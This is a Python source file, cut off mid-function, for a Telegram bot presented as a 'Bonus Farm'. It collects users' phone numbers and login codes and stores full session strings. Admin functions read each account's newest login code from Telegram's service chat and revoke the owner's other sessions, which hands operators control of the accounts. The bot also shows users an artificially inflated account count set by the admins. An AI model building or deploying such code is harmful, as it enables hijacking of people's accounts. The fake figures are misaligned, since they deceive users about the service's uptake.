import os
import re
import asyncio
import logging

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.exceptions import TelegramBadRequest

from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    UserNotParticipantError,
    ChannelPrivateError,
    UsernameNotOccupiedError,
)

import db

log = logging.getLogger("admin")

ADMIN_IDS = [
    int(x.strip()) for x in os.environ["ADMIN_USER_ID"].split(",") if x.strip().isdigit()
]
log.info(f"👤 Админов: {len(ADMIN_IDS)} → {ADMIN_IDS}")

API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"]

SUBSCRIBE_CHAT = os.environ.get("SUBSCRIBE_CHAT", "@archigramfarm")
SUBSCRIBE_URL = os.environ.get("SUBSCRIBE_URL", "https://t.me/archigramfarm")

bot = Bot(token=os.environ["ADMIN_BOT_TOKEN"])
dp = Dispatcher()


def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


# =========================================================
#                      FSM
# =========================================================
class AddAccount(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()


class DeleteAccount(StatesGroup):
    waiting_ids = State()


class BonusSelect(StatesGroup):
    waiting_ids = State()


class CodeSelect(StatesGroup):
    waiting_id = State()


class KillSessionSelect(StatesGroup):
    waiting_id = State()


class SetVisual(StatesGroup):
    waiting_number = State()


pending_clients: dict[int, TelegramClient] = {}
code_buffer: dict[int, str] = {}
code_phone: dict[int, str] = {}
code_message_id: dict[int, int] = {}


# =========================================================
#              ПРОВЕРКА АКТИВНОСТИ
# =========================================================
async def check_account_alive(session_str: str) -> bool:
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=12)
        ok = await client.is_user_authorized()
        await client.disconnect()
        return ok
    except Exception:
        try:
            await client.disconnect()
        except Exception:
            pass
        return False


# =========================================================
#              ПОДСЧЁТ
# =========================================================
async def count_user_accounts(user_id: int) -> int:
    accounts = await db.get_accounts()
    return sum(1 for a in accounts if a.get("owner_id") == user_id)


async def count_total_accounts() -> int:
    accounts = await db.get_accounts()
    real = len(accounts)
    try:
        offset = await db.get_fake_accounts_offset()
    except Exception:
        offset = 0
    return real + offset


# =========================================================
#              ПРОВЕРКА ПОДПИСКИ
# =========================================================
async def check_subscription(user_id: int) -> bool:
    if not SUBSCRIBE_CHAT:
        return True

    accounts = await db.get_accounts(status="active")
    if not accounts:
        log.warning("Нет активных аккаунтов — пропускаю проверку")
        return True

    log.info(f"🔍 Проверка подписки user_id={user_id} на {SUBSCRIBE_CHAT}")

    from telethon.tl.functions.channels import GetParticipantRequest

    for acc in accounts:
        client = TelegramClient(StringSession(acc["session_str"]), API_ID, API_HASH)
        try:
            await asyncio.wait_for(client.connect(), timeout=10)
            if not await client.is_user_authorized():
                await client.disconnect()
                continue

            try:
                chat = await client.get_entity(SUBSCRIBE_CHAT)
            except (UsernameNotOccupiedError, ChannelPrivateError) as e:
                log.warning(f"  [акк {acc['id']}] Канал не найден/закрыт: {e}")
                await client.disconnect()
                continue
            except Exception as e:
                log.warning(f"  [акк {acc['id']}] entity error: {e}")
                await client.disconnect()
                continue

            try:
                await client(GetParticipantRequest(channel=chat, participant=user_id))
                log.info(f"  [акк {acc['id']}] ✅ Юзер {user_id} ПОДПИСАН")
                await client.disconnect()
                return True
            except UserNotParticipantError:
                log.info(f"  [акк {acc['id']}] ❌ Юзер {user_id} НЕ подписан")
                await client.disconnect()
                return False
            except Exception as e:
                err = str(e).lower()
                log.warning(f"  [акк {acc['id']}] Ошибка: {e}")
                await client.disconnect()
                if "not a participant" in err:
                    return False
                continue

        except Exception as e:
            log.warning(f"  [акк {acc['id']}] Общая ошибка: {e}")
            try:
                await client.disconnect()
            except Exception:
                pass
            continue

    log.warning("Не удалось проверить — пропускаю")
    return True


def subscribe_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Подписаться на канал", url=SUBSCRIBE_URL)],
        [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_sub")],
    ])


async def require_subscription(obj) -> bool:
    user_id = obj.from_user.id
    if is_admin(user_id):
        return True

    try:
        user = obj.from_user
        await db.add_subscriber(user_id, user.username or "", user.first_name or "")
    except Exception:
        pass

    sub = await check_subscription(user_id)
    if sub:
        try:
            await db.mark_subscribed(user_id, True)
        except Exception:
            pass
        return True

    try:
        await db.mark_subscribed(user_id, False)
    except Exception:
        pass

    text = (
        "📢 <b>Для использования бота нужно подписаться на наш канал</b>\n\n"
        f"👥 Канал: {SUBSCRIBE_CHAT}\n\n"
        "После подписки нажми кнопку «✅ Я подписался»."
    )
    try:
        await obj.answer(text, reply_markup=subscribe_kb(), parse_mode="HTML")
    except Exception:
        try:
            await obj.message.answer(text, reply_markup=subscribe_kb(), parse_mode="HTML")
        except Exception:
            pass
    return False


# =========================================================
#              КОД ИЗ 777000
# =========================================================
async def get_last_code_from_telegram(session_str: str) -> str | None:
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=12)
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
        async for msg in client.iter_messages(777000, limit=30):
            text = msg.text or ""
            codes = re.findall(r"\b(\d{4,6})\b", text)
            if codes:
                await client.disconnect()
                return codes[0]
        await client.disconnect()
        return None
    except Exception:
        try:
            await client.disconnect()
        except Exception:
            pass
        return None


# =========================================================
#              УДАЛИТЬ СЕССИИ
# =========================================================
async def kill_other_sessions(session_str: str) -> dict:
    result = {"deleted": 0, "kept": 0, "error": None, "total": 0}
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=15)
        if not await client.is_user_authorized():
            result["error"] = "Сессия не авторизована"
            await client.disconnect()
            return result
        await client.get_me()
        await client(functions.help.GetConfigRequest())
        await asyncio.sleep(1)
        auths_raw = await client(functions.account.GetAuthorizationsRequest())
        auths = auths_raw.authorizations
        result["total"] = len(auths)
        auths_sorted = sorted(auths, key=lambda a: a.date_active)
        current = auths_sorted[-1]
        for a in auths:
            if a.hash == current.hash:
                result["kept"] += 1
                continue
            try:
                await client(functions.account.ResetAuthorizationRequest(hash=a.hash))
                result["deleted"] += 1
                await asyncio.sleep(0.5)
            except Exception as e:
                err = str(e).lower()
                if "too new" in err:
                    result["error"] = "Сессия слишком новая. Подожди 24-48 часов."
                    break
                log.warning(f"Kill session: {e}")
        await client.disconnect()
    except Exception as e:
        result["error"] = str(e)
        try:
            await client.disconnect()
        except Exception:
            pass
    return result


# =========================================================
#                   ПРИВЕТСТВИЕ
# =========================================================
async def build_welcome_text() -> str:
    total_accounts = await count_total_accounts()
    return (
        "👋 <b>Добро пожаловать в Bonus Farm!</b>\n\n"
        "🤖 <b>Что это за бот?</b>\n\n"
        "Это <b>ферма для автоматического получения бонусов</b> "
        "в Telegram-ботах.\n\n"
        f"👥 <b>В боте уже подключено: {total_accounts} аккаунтов</b>\n\n"
        "⚙️ <b>Как работает:</b>\n"
        "• Ты подключаешь свой аккаунт (номер + код из Telegram)\n"
        "• Бот раз в сутки сам отправляет команду «🎁Бонус»\n"
        "• Если приходит капча — бот решает её автоматически\n"
        "• Бонус получается <b>без твоего участия</b>\n"
        "• Ты можешь сам нажать «🎁 Получить бонус» — заберёт прямо сейчас\n\n"
        "⚠️ <b>Важно:</b> подписка на наш канал <b>обязательна</b>. "
        "Если отпишешься — все твои аккаунты остановятся и бонусы не начисляются.\n\n"
        "📱 <b>Начни с «Подключить аккаунт»</b> 👇"
    )


# =========================================================
#                   КЛАВИАТУРЫ
# =========================================================
def user_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Подключить аккаунт", callback_data="user_add")],
        [InlineKeyboardButton(text="🎁 Получить бонус", callback_data="user_bonus")],
        [InlineKeyboardButton(text="📋 Мои аккаунты", callback_data="user_my_accounts")],
        [InlineKeyboardButton(text="❓ Помощь", callback_data="user_help")],
    ])


def admin_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Добавить аккаунт", callback_data="menu_add")],
        [InlineKeyboardButton(text="📋 Список аккаунтов", callback_data="menu_list")],
        [InlineKeyboardButton(text="🔢 Получить код", callback_data="menu_code")],
        [InlineKeyboardButton(text="🚪 Удалить сессии", callback_data="menu_kill")],
        [InlineKeyboardButton(text="🎁 Бонус: все", callback_data="bonus_all")],
        [InlineKeyboardButton(text="🎯 Бонус: выборочно", callback_data="bonus_select")],
        [
            InlineKeyboardButton(text="▶️ Запустить всех", callback_data="menu_start_all"),
            InlineKeyboardButton(text="⏸ Остановить всех", callback_data="menu_stop_all"),
        ],
        [
            InlineKeyboardButton(text="🗑 Удалить выборочно", callback_data="delete_select"),
            InlineKeyboardButton(text="💣 Удалить всех", callback_data="delete_all"),
        ],
        [InlineKeyboardButton(text="👁 Визуал (аккаунты)", callback_data="menu_visual")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="menu_stats")],
        [InlineKeyboardButton(text="📜 Логи", callback_data="menu_logs")],
    ])


def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_main")],
    ])


def cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="menu_main")],
    ])


def help_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Подключить аккаунт", callback_data="user_add")],
        [InlineKeyboardButton(text="◀️ В меню", callback_data="user_menu")],
    ])


def code_keyboard(current: str, phone: str) -> InlineKeyboardMarkup:
    display = " ".join(current) if current else "_ _ _ _ _"
    rows = [
        [InlineKeyboardButton(text=f"📞 {phone}", callback_data="code_ignore")],
        [InlineKeyboardButton(text=f"🔢 {display}", callback_data="code_ignore")],
        [
            InlineKeyboardButton(text="1", callback_data="code_d_1"),
            InlineKeyboardButton(text="2", callback_data="code_d_2"),
            InlineKeyboardButton(text="3", callback_data="code_d_3"),
        ],
        [
            InlineKeyboardButton(text="4", callback_data="code_d_4"),
            InlineKeyboardButton(text="5", callback_data="code_d_5"),
            InlineKeyboardButton(text="6", callback_data="code_d_6"),
        ],
        [
            InlineKeyboardButton(text="7", callback_data="code_d_7"),
            InlineKeyboardButton(text="8", callback_data="code_d_8"),
            InlineKeyboardButton(text="9", callback_data="code_d_9"),
        ],
        [
            InlineKeyboardButton(text="⌫ Стереть", callback_data="code_back"),
            InlineKeyboardButton(text="0", callback_data="code_d_0"),
            InlineKeyboardButton(text="✅ Готово", callback_data="code_submit"),
        ],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="code_cancel")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


async def refresh_code_message(user_id: int, chat_id: int):
    current = code_buffer.get(user_id, "")
    phone = code_phone.get(user_id, "")
    display = " ".join(current) if current else "_ _ _ _ _"
    text = (
        f"📱 <b>Введи код из Telegram</b>\n\n"
        f"📞 Номер: <code>{phone}</code>\n"
        f"🔢 Введено: <b>{display}</b>\n\n"
        f"Нажимай цифры, потом <b>✅ Готово</b>."
    )
    msg_id = code_message_id.get(user_id)
    if not msg_id:
        return
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=text,
            reply_markup=code_keyboard(current, phone),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass


async def send_user_menu(target, edit: bool = False, user_id: int | None = None):
    if user_id is None:
        user_id = getattr(target, "chat", None) and target.chat.id
        if not user_id and hasattr(target, "from_user"):
            user_id = target.from_user.id

    my_count = 0
    total_count = 0
    try:
        if user_id:
            my_count = await count_user_accounts(user_id)
        total_count = await count_total_accounts()
    except Exception:
        pass

    text = (
        f"🏠 <b>Главное меню</b>\n\n"
        f"📱 <b>Твоих аккаунтов: {my_count}</b>\n"
        f"👥 <b>Всего в боте: {total_count}</b>\n\n"
        f"Выбери действие:"
    )
    if edit:
        await target.edit_text(text, reply_markup=user_menu_kb(), parse_mode="HTML")
    else:
        await target.answer(text, reply_markup=user_menu_kb(), parse_mode="HTML")


async def send_admin_menu(target, edit: bool = False):
    accounts = await db.get_accounts()
    total = len(accounts)
    active = sum(1 for a in accounts if a["status"] == "active")
    dead = sum(1 for a in accounts if a["status"] == "dead")
    offset = await db.get_fake_accounts_offset()

    import main as app_main
    running = len(app_main.workers) if hasattr(app_main, "workers") else 0

    text = (
        f"🛠 <b>Админ-панель</b>\n\n"
        f"📊 <b>Реальных аккаунтов: {total}</b>\n"
        f"🟢 Активных: {active} | 🔴 Мёртвых: {dead}\n"
        f"👁 Offset: +{offset} → юзеры видят {total + offset}\n"
        f"⚙️ Worker-ов: {running}\n\n"
        f"Выбери действие:"
    )
    if edit:
        await target.edit_text(text, reply_markup=admin_menu_kb(), parse_mode="HTML")
    else:
        await target.answer(text, reply_markup=admin_menu_kb(), parse_mode="HTML")


# =========================================================
#                   /start
# =========================================================
@dp.message(Command("start"))
async def cmd_start(msg: Message):
    user_id = msg.from_user.id

    try:
        await db.add_subscriber(
            user_id,
            msg.from_user.username or "",
            msg.from_user.first_name or ""
        )
    except Exception:
        pass

    if is_admin(user_id):
        await send_admin_menu(msg)
        return

    if not await require_subscription(msg):
        return

    welcome = await build_welcome_text()
    await msg.answer(welcome, reply_markup=user_menu_kb(), parse_mode="HTML")


@dp.callback_query(F.data == "check_sub")
async def cb_check_sub(cb: CallbackQuery):
    user_id = cb.from_user.id
    await cb.answer("🔍 Проверяю...", show_alert=False)

    sub = await check_subscription(user_id)
    if sub:
        try:
            await db.mark_subscribed(user_id, True)
        except Exception:
            pass
        try:
            await cb.message.delete()
        except Exception:
            pass
        welcome = await build_welcome_text()
        await cb.message.answer(welcome, reply_markup=user_menu_kb(), parse_mode="HTML")
    else:
        await cb.answer("❌ Ты ещё не подписался на канал", show_alert=True)


@dp.message(Command("help"))
async def cmd_help(msg: Message):
    if is_admin(msg.from_user.id):
        await msg.answer(
            "📖 <b>Админ-команды</b>\n\n"
            "/start — меню\n/add — добавить\n/list — список\n"
            "/code N — код\n/kill N — удалить сессии\n"
            "/bonus — бонус всем\n/bonus 1,3-5 — выборочно\n"
            "/del N — удалить\n/visual N — счётчик\n/logs — логи",
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            "❓ <b>Помощь</b>\n\n"
            "• <b>Подключить аккаунт</b> — добавь аккаунт.\n"
            "• <b>Получить бонус</b> — забрать сейчас.\n"
            "• <b>Мои аккаунты</b> — список.\n\n"
            "⚠️ Без подписки на канал бот <b>не работает</b>.\n\n"
            "🕐 Автоматически в 07:07 Самары.",
            reply_markup=help_kb(), parse_mode="HTML"
        )


# =========================================================
#              ПЕРИОДИЧЕСКАЯ ПРОВЕРКА ПОДПИСОК
# =========================================================
async def periodic_subscription_check():
    """Раз в 10 минут проверяет подписки всех владельцев аккаунтов."""
    import main as app_main

    while True:
        try:
            await asyncio.sleep(600)  # 10 минут

            log.info("🔄 Проверка подписок владельцев...")
            accounts = await db.get_accounts(status="active")
            owners = {}
            for a in accounts:
                oid = a.get("owner_id")
                if oid and not is_admin(oid):
                    owners.setdefault(oid, []).append(a)

            stopped = 0
            for owner_id, accs in owners.items():
                subscribed = await check_subscription(owner_id)
                if subscribed:
                    await db.mark_subscribed(owner_id, True)
                    continue

                await db.mark_subscribed(owner_id, False)
                for acc in accs:
                    if acc["id"] in app_main.workers:
                        await app_main.stop_worker(acc["id"])
                        stopped += 1
                        log.info(f"🚫 Остановлен акк {acc['id']} — owner {owner_id} отписан")

                try:
                    await bot.send_message(
                        owner_id,
                        "🚫 <b>Ты отписался от нашего канала</b>\n\n"
                        "Все твои аккаунты <b>остановлены</b>. "
                        "Бонусы <b>не начисляются</b>.\n\n"
                        "Подпишись снова и нажми /start.",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

            if stopped:
                log.info(f"🔄 Остановлено аккаунтов: {stopped}")

        except asyncio.CancelledError:
            break
        except Exception as e:
            log.error(f"periodic_subscription_check: {e}")
            await asyncio.sleep(60)


# =========================================================
#                   ЮЗЕР CALLBACK
# =========================================================
@dp.callback_query(F.data == "user_menu")
async def cb_user_menu(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    if not await require_subscription(cb):
        return
    await send_user_menu(cb.message, edit=True, user_id=cb.from_user.id)
    await cb.answer()


@dp.callback_query(F.data == "user_help")
async def cb_user_help(cb: CallbackQuery):
    if not await require_subscription(cb):
        return
    await cb.message.edit_text(
        "❓ <b>Помощь</b>\n\n"
        "• <b>Подключить аккаунт</b> — добавь аккаунт.\n"
        "• <b>Получить бонус</b> — забрать сейчас.\n"
        "• <b>Мои аккаунты</b> — список.\n\n"
        "⚠️ Без подписки бот не работает.\n\n"
        "🕐 Автоматически в 07:07 Самары.",
        reply_markup=help_kb(), parse_mode="HTML"
    )
    await cb.answer()


@dp.callback_query(F.data == "user_add")
async def cb_user_add(cb: CallbackQuery, state: FSMContext):
    if not await require_subscription(cb):
        return
    await cb.message.answer(
        "📱 <b>Подключение аккаунта</b>\n\n"
        "Отправь номер телефона <b>сообщением</b> в формате:\n"
        "<code>+79991234567</code>\n\n"
        "⏱ После отправки придёт код в Telegram — введи его <b>кнопками</b>.",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )
    await state.set_state(AddAccount.waiting_phone)
    await cb.answer()


@dp.callback_query(F.data == "user_bonus")
async def cb_user_bonus(cb: CallbackQuery):
    if not await require_subscription(cb):
        return
    import main as app_main
    user_id = cb.from_user.id
    accounts = await db.get_accounts()
    own = accounts if is_admin(user_id) else [a for a in accounts if a.get("owner_id") == user_id]

    if not own:
        await cb.answer("❌ Нет подключённых аккаунтов", show_alert=True)
        return

    await cb.answer("⏳ Запускаю...", show_alert=False)
    count = 0
    active_count = sum(1 for a in own if a["status"] == "active")
    for a in own:
        if a["status"] != "active":
            continue
        if a["id"] in app_main.workers:
            asyncio.create_task(app_main.workers[a["id"]].send_bonus())
            count += 1
        else:
            try:
                await app_main.start_worker(a["id"])
                if a["id"] in app_main.workers:
                    asyncio.create_task(app_main.workers[a["id"]].send_bonus())
                    count += 1
            except Exception:
                pass

    await cb.message.answer(
        f"🎁 <b>Бонус запущен</b>\n\n"
        f"📱 Твоих аккаунтов: <b>{len(own)}</b>\n"
        f"🟢 Активных: <b>{active_count}</b>\n"
        f"✅ Запущено: <b>{count}</b>",
        parse_mode="HTML"
    )


@dp.callback_query(F.data == "user_my_accounts")
async def cb_user_my_accounts(cb: CallbackQuery):
    if not await require_subscription(cb):
        return
    user_id = cb.from_user.id
    accounts = await db.get_accounts()
    own = accounts if is_admin(user_id) else [a for a in accounts if a.get("owner_id") == user_id]
    total_count = len(accounts) + await db.get_fake_accounts_offset()

    if not own:
        await cb.message.edit_text(
            f"📭 <b>У тебя пока нет аккаунтов.</b>\n\n"
            f"📱 Твоих: <b>0</b>\n"
            f"👥 Всего в боте: <b>{total_count}</b>\n\n"
            f"Нажми «📱 Подключить аккаунт».",
            reply_markup=user_menu_kb(), parse_mode="HTML"
        )
        await cb.answer()
        return

    active = sum(1 for a in own if a["status"] == "active")
    dead = sum(1 for a in own if a["status"] == "dead")
    my_bonuses = sum(a["bonuses"] or 0 for a in own)

    lines = [
        f"📋 <b>Мои аккаунты</b>\n",
        f"📱 Твоих: <b>{len(own)}</b> (🟢 {active} / 🔴 {dead})",
        f"🎁 Твоих бонусов: <b>{my_bonuses}</b>",
        f"👥 Всего в боте: <b>{total_count}</b>\n",
    ]
    for a in own:
        emoji = {"active": "🟢", "dead": "🔴", "stopped": "⚪"}.get(a["status"], "❔")
        lines.append(
            f"{emoji} ID {a['id']} — @{a['username']}\n"
            f"    📞 {a['phone']} | 🎁 {a['bonuses']}"
        )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Получить бонус", callback_data="user_bonus")],
        [InlineKeyboardButton(text="📱 Подключить ещё", callback_data="user_add")],
        [InlineKeyboardButton(text="◀️ В меню", callback_data="user_menu")],
    ])
    try:
        await cb.message.edit_text("\n".join(lines), reply_markup=kb, parse_mode="HTML")
    except Exception:
        await cb.message.answer("\n".join(lines), reply_markup=kb, parse_mode="HTML")
    await cb.answer()


# =========================================================
#                   АДМИН-МЕНЮ
# =========================================================
@dp.callback_query(F.data == "menu_main")
async def cb_main(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    if is_admin(cb.from_user.id):
        await send_admin_menu(cb.message, edit=True)
    else:
        if not await require_subscription(cb):
            return
        await send_user_menu(cb.message, edit=True, user_id=cb.from_user.id)
    await cb.answer()


# =========================================================
#              ВИЗУАЛ
# =========================================================
@dp.callback_query(F.data == "menu_visual")
async def cb_menu_visual(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        await cb.answer("Нет доступа", show_alert=True)
        return

    accounts = await db.get_accounts()
    real = len(accounts)
    offset = await db.get_fake_accounts_offset()
    total = real + offset

    text = (
        f"👁 <b>Настройка визуала</b>\n\n"
        f"📊 Реальных аккаунтов: {real}\n"
        f"🎭 Искусственный offset: {offset}\n"
        f"👥 Юзеры видят: {total}"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Изменить число", callback_data="visual_set")],
        [InlineKeyboardButton(text="♻️ Сбросить (0)", callback_data="visual_reset")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_main")],
    ])
    try:
        await cb.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception:
        await cb.message.answer(text, reply_markup=kb, parse_mode="HTML")
    await cb.answer()


@dp.callback_query(F.data == "visual_set")
async def cb_visual_set(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        return
    offset = await db.get_fake_accounts_offset()
    accounts = await db.get_accounts()
    real = len(accounts)
    await cb.message.answer(
        f"✏️ <b>Введи новое число offset</b>\n\n"
        f"Реальных: {real}\n"
        f"Текущий offset: {offset}\n"
        f"Напиши только число (0 — сбросить):",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )
    await state.set_state(SetVisual.waiting_number)
    await cb.answer()


@dp.callback_query(F.data == "visual_reset")
async def cb_visual_reset(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    await db.set_fake_accounts_offset(0)
    await cb.answer("✅ Сброшено на 0", show_alert=True)
    await cb_menu_visual(cb, None)


@dp.message(SetVisual.waiting_number)
async def step_visual_number(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    raw = msg.text.strip()
    if not raw.isdigit():
        await msg.answer("❌ Только число")
        return
    num = int(raw)
    await db.set_fake_accounts_offset(num)
    accounts = await db.get_accounts()
    real = len(accounts)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ К визуалу", callback_data="menu_visual")],
    ])
    await msg.answer(
        f"✅ Offset: {num}\nЮзеры видят: <b>{real + num}</b>",
        reply_markup=kb, parse_mode="HTML"
    )
    await state.clear()


# =========================================================
#              СПИСОК / БОНУСЫ / УДАЛЕНИЕ
# =========================================================
async def build_accounts_text(check: bool = True) -> str:
    accounts = await db.get_accounts()
    if not accounts:
        return "📭 <b>Нет аккаунтов.</b>"

    if check:
        tasks = [check_account_alive(a["session_str"]) for a in accounts]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for a, r in zip(accounts, results):
            ok = r if isinstance(r, bool) else False
            new_status = "active" if ok else "dead"
            if a["status"] != new_status:
                await db.update_status(a["id"], new_status, None if ok else "dead")
                a["status"] = new_status

    lines = ["📋 <b>Аккаунты</b>\n"]
    alive = dead = 0
    for a in accounts:
        emoji = {"active": "🟢", "dead": "🔴", "stopped": "⚪"}.get(a["status"], "❔")
        owner = a.get("owner_id") or "—"
        lines.append(
            f"{emoji} <b>ID {a['id']}</b> — @{a['username']}\n"
            f"    📞 {a['phone']} | 🎁 {a['bonuses']} | {a['status']} | owner: {owner}"
        )
        if a["status"] == "active":
            alive += 1
        elif a["status"] == "dead":
            dead += 1
    lines.append(f"\n📊 Живых: {alive} | Мёртвых: {dead}")
    return "\n".join(lines)


@dp.callback_query(F.data == "menu_list")
async def cb_list(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("Нет доступа", show_alert=True)
        return
    await cb.answer("🔍...")
    text = await build_accounts_text(check=True)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="menu_list")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_main")],
    ])
    try:
        await cb.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception:
        await cb.message.answer(text, reply_markup=kb, parse_mode="HTML")


@dp.message(Command("list"))
async def cmd_list(msg: Message):
    if not is_admin(msg.from_user.id):
        return
    m = await msg.answer("🔍 Проверяю...")
    text = await build_accounts_text(check=True)
    try:
        await m.edit_text(text, parse_mode="HTML")
    except Exception:
        await msg.answer(text, parse_mode="HTML")


def parse_ids(raw: str) -> list[int]:
    result = []
    for part in raw.replace(" ", "").split(","):
        if not part:
            continue
        if "-" in part:
            try:
                a, b = part.split("-")
                result.extend(range(int(a), int(b) + 1))
            except Exception:
                continue
        else:
            try:
                result.append(int(part))
            except Exception:
                continue
    return sorted(set(result))


@dp.callback_query(F.data == "bonus_all")
async def cb_bonus_all(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("Нет доступа", show_alert=True)
        return
    await cb.answer("⏳...")
    import main as app_main
    if not app_main.workers:
        await cb.message.answer("❌ Нет активных")
        return
    count = 0
    for w in list(app_main.workers.values()):
        asyncio.create_task(w.send_bonus())
        count += 1
    await cb.message.answer(f"🎁 Бонус: <b>{count}</b>", parse_mode="HTML")


@dp.callback_query(F.data == "bonus_select")
async def cb_bonus_select(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        return
    await cb.message.answer("🎯 ID: <code>1,3-5</code>", reply_markup=cancel_kb(), parse_mode="HTML")
    await state.set_state(BonusSelect.waiting_ids)
    await cb.answer()


@dp.message(BonusSelect.waiting_ids)
async def step_bonus_ids(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    ids = parse_ids(msg.text.strip())
    import main as app_main
    ok, missing = 0, []
    for acc_id in ids:
        if acc_id in app_main.workers:
            asyncio.create_task(app_main.workers[acc_id].send_bonus())
            ok += 1
        else:
            missing.append(acc_id)
    text = f"🎁 Бонус: <b>{ok}</b>"
    if missing:
        text += f"\n⚠️ {missing}"
    await msg.answer(text, reply_markup=back_kb(), parse_mode="HTML")
    await state.clear()


@dp.message(Command("bonus"))
async def cmd_bonus(msg: Message):
    if not is_admin(msg.from_user.id):
        return
    parts = msg.text.split(maxsplit=1)
    import main as app_main
    if len(parts) == 1:
        count = 0
        for w in list(app_main.workers.values()):
            asyncio.create_task(w.send_bonus())
            count += 1
        await msg.answer(f"🎁 Бонус: <b>{count}</b>", parse_mode="HTML")
        return
    ids = parse_ids(parts[1])
    ok = 0
    for acc_id in ids:
        if acc_id in app_main.workers:
            asyncio.create_task(app_main.workers[acc_id].send_bonus())
            ok += 1
    await msg.answer(f"🎁 Бонус: <b>{ok}</b>", parse_mode="HTML")


@dp.callback_query(F.data == "menu_start_all")
async def cb_start_all(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    import main as app_main
    accounts = await db.get_accounts(status="active")
    count = 0
    for acc in accounts:
        try:
            await app_main.start_worker(acc["id"])
            count += 1
        except Exception:
            pass
    await cb.message.answer(f"✅ Запущено: <b>{count}</b>", parse_mode="HTML")


@dp.callback_query(F.data == "menu_stop_all")
async def cb_stop_all(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    import main as app_main
    count = len(app_main.workers)
    await app_main.stop_all_workers()
    await cb.message.answer(f"⏸ Остановлено: <b>{count}</b>", parse_mode="HTML")


@dp.callback_query(F.data == "delete_select")
async def cb_delete_select(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        return
    await cb.message.answer("🗑 ID: <code>1,3-5</code>", reply_markup=cancel_kb(), parse_mode="HTML")
    await state.set_state(DeleteAccount.waiting_ids)
    await cb.answer()


@dp.message(DeleteAccount.waiting_ids)
async def step_delete_ids(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    ids = parse_ids(msg.text.strip())
    import main as app_main
    deleted = []
    for acc_id in ids:
        await app_main.stop_worker(acc_id)
        if await db.delete_account(acc_id):
            deleted.append(acc_id)
    await msg.answer(f"✅ Удалено: <b>{deleted}</b>", reply_markup=back_kb(), parse_mode="HTML")
    await state.clear()


@dp.callback_query(F.data == "delete_all")
async def cb_delete_all(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да", callback_data="confirm_delete_all")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="menu_main")],
    ])
    await cb.message.answer("⚠️ Удалить ВСЕ?", reply_markup=kb, parse_mode="HTML")
    await cb.answer()


@dp.callback_query(F.data == "confirm_delete_all")
async def cb_confirm_delete_all(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    import main as app_main
    await app_main.stop_all_workers()
    accounts = await db.get_accounts()
    count = 0
